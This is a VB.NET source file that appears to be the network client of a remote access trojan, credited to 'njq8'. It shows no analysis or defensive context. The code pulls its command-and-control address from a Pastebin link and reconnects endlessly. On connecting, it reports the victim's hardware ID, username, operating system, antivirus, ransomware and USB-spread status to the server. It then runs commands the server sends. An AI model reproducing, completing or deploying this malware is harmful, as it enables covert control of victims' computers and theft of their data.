Imports System.Net

Public Class TCP
    'credit to njq8
    Public Shared KEY As String = "|'N'|"
    Public Shared SPL As String = "|'L'|"
    Public Shared C As Net.Sockets.TcpClient
    Public Shared R As New Random

    Public Shared Sub CON()
        Dim t As New Threading.Thread(AddressOf REC)
        t.Start()
    End Sub

    Public Shared Sub Send(ByVal b As Byte())
        If CNT = False Then Exit Sub
        Try
            Dim r As Object = New IO.MemoryStream
            r.Write(b, 0, b.Length)
            r.Write(SB(KEY), 0, KEY.Length)
            C.Client.Send(r.ToArray, 0, r.Length, Net.Sockets.SocketFlags.None)
            r.Dispose()
        Catch ex As Exception
            CNT = False
        End Try
    End Sub
    Public Shared Sub Send(ByVal S As String)
        Send(SB(S))
    End Sub
    Public Shared CNT As Boolean = False
    Public Shared Sub REC()
        Dim MS As New IO.MemoryStream ' create memory stream
        Dim KA As Integer = 0
re:
        Try
            If C Is Nothing Then GoTo e
            If C.Client.Connected = False Then GoTo e
            If CNT = False Then GoTo e
            KA += 1
            If KA > 500 Then
                KA = 0
                ' check if i am still connected
                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo e
            End If
            If C.Available > 0 Then
                Dim B(C.Available - 1) As Byte
                C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                MS.Write(B, 0, B.Length)
rr:
                If BS(MS.ToArray).Contains(KEY) Then ' split packet..
                    Dim A As Array = fx(MS.ToArray, KEY)
                    Dim T As New Threading.Thread(AddressOf Commands.Data)
                    T.Start(A(0))
                    MS.Dispose()
                    MS = New IO.MemoryStream
                    If A.Length = 2 Then
                        MS.Write(A(1), 0, A(1).length)
                        GoTo rr
                    End If
                End If
            End If
        Catch ex As Exception
            GoTo e
        End Try
        Threading.Thread.CurrentThread.Sleep(1)
        GoTo re
e:      ' clear things and ReConnect
        CNT = False
        Try
            C.Client.Disconnect(False)
        Catch ex As Exception
        End Try
        Try
            MS.Dispose()
        Catch ex As Exception
        End Try
        MS = New IO.MemoryStream
        Try
            C = New Net.Sockets.TcpClient
            C.ReceiveTimeout = -1
            C.SendTimeout = -1
            C.SendBufferSize = 999999
            C.ReceiveBufferSize = 999999
            C.Client.SendBufferSize = 999999
            C.Client.ReceiveBufferSize = 999999
            KA = 0

            Try
                Dim WC As WebClient = New WebClient() 'Pastebin, split by ":" IP:PORT
                Dim reply As String = WC.DownloadString(Settings.Pastebin)
                Settings.HOST = reply.Split(":")(0)
                Settings.PORT = reply.Split(":")(1)
                WC.Dispose()
            Catch ex As Exception
            End Try

            C.Client.Connect(Settings.HOST, Settings.PORT)
            CNT = True
            'Send info to server
            Send("info" & SPL & ID.HWID & SPL & ID.UserName & SPL & IO.Path.GetFileName(Application.ExecutablePath) & SPL & "v0.5.5" & SPL & ID.MyOS & " " & ID.Bit & SPL & ID.INDATE & SPL & ID.AV & SPL & ID.Ransomeware & SPL & ID.USBSP & SPL & " ")
        Catch ex As Exception
            Threading.Thread.CurrentThread.Sleep(R.Next(5000))
            GoTo e
        End Try
        GoTo re
    End Sub

End Class